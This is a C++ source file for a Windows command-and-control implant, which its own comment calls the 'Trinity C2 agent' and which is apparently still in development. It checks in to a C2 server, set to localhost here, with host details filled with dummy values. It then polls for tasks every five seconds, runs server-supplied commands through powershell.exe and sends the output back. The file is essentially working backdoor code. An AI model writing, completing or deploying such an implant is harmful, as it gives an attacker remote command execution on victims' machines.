//  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ { START OF FILE } ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ //
#include "Agent.h"
#include "CommManager.h"
#include "CheckinModels.h"
#include <windows.h>
#include <vector>

void Agent::Exit()
{
    // Exit agent process
    ExitProcess(0);
}

std::string Agent::GetUID()
{
    char username[256];
    DWORD username_len = sizeof(username);
    // Get the username of the current user
    if (GetUserNameA(username, &username_len))
    {
        return std::string(username);
    }

    return std::string();
}

std::string Agent::ExecuteCommand(int commandType)
{
    switch (commandType)
    {
    case 0x0017:
        return GetUID();
    default:
        return std::string();
    }
}

std::string Agent::ExecutePowerShell(const std::string &command)
{
#ifdef _WIN32
    // Execute PowerShell command and return the output
    std::string result;
    std::string psCommand = "powershell.exe -Command \"" + command + "\"";
    FILE *pipe = _popen(psCommand.c_str(), "r");
    if (!pipe)
    {
        return "Error executing PowerShell command.";
    }

    char buffer[128];
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr)
    {
        result += buffer;
    }

    _pclose(pipe);
    return result;
#else
    (void)command; // Suppress unused parameter warning
    return "PowerShell execution is only supported on Windows.";
#endif
}

void Agent::Init()
{
    // Initialize agent
    user = GetUID();
}

std::string Agent::GetUser() const
{
    return user;
}

int main(int argc, char *argv[])
{
    std::vector<ResultRequest> taskResults;
    CommManager manager("d0e055ee-4290-4bbd-abff-71fbdfcc4058", "localhost");

    IntitalCheckinRequest dummyData = {
    "192.168.1.101",          // internalIP
    "203.0.113.45",           // externalIP (example public IP)
    "Windows 11 Pro",         // OS
    "testuser",               // user
    "exampleProcess.exe",     // processName
    4567,                     // PID
    "High",                   // integrity (could be Low/Medium/High)
    "00:1A:2B:3C:4D:5E",      // macAddress
    "ASUS PRIME Z590-A",      // motherboard
    16,                       // RAM in GB
    512.0,                    // diskSize in GB
    320.5,                    // FreeDisk in GB
    8                         // CPUCount
    };

    // Call InitialCheckinRequest
    // Stores the callbackUUID
    manager.IntialCheckin(dummyData.StructToJson());
    CheckinResponse response;
    Agent agent;
    agent.Init();

    std::string rawJson;
    while (true)
    {
        if (taskResults.empty())
        {
            rawJson = manager.Checkin();
        }
        else
        {
            std::string taskResultJSON = taskResults.front().StructToJson();
            rawJson = manager.Checkin(taskResultJSON);
        }

        if (!rawJson.empty())
        {
            response = ParseCommand(rawJson);
            switch (response.type)
            {
            case 1:
                std::string result = agent.ExecutePowerShell(response.powerShellCommand.commandlet);
                ResultRequest requestresult = { response.id, "Successful", result };
                taskResults.push_back(requestresult);
                break;
            }

        }
        Sleep(5000);
    }
    // Enter agent loop (delayed every 5 seconds)
    // Call Checkin method uses the callbackuuid 
    // Serialise the request using ParseCommand
    // 

    //std::string hello = dummyData.StructToJson();
    //manager.IntialCheckin(hello);
    //MessageBoxA(NULL, "Trinity C2 agent", ";)", MB_OK);

    //Agent agent;
    //agent.Init();
    //CheckinResponse response;
    //std::string command = R"(
    //{ 
    //    "taskID": 4, 
    //    "agentID": 9, 
    //    "commandType": "PowerShell", 
    //    "command": { "Arguements": "test", "Commandlet": "ls" },
    //    "timestamp": "2026" 
    //}
    //)";

    //response = ParseCommand(command);

    //switch (string_hash(response.type))
    //{
    //    case string_hash("PowerShell"):
    //        std::string result = agent.ExecutePowerShell(response.powerShellCommand.commandlet);
    //        std::cout << result << "\n";
    //        break;
    //}
    return 0;
}

//  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ { END OF FILE } ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ //
